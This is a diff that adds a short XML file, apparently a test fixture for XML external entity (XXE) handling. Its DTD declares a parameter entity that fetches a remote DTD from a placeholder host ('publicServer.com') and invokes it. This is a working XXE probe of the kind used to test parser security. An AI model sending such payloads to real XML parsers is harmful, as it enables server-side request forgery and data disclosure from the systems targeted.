@@ -1,0 +1,7 @@
+<?xml version='1.0'?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY % remote SYSTEM "http://publicServer.com/url_invocation_parameterEntity.dtd">
+%remote; 
+]>
+<data>4</data>
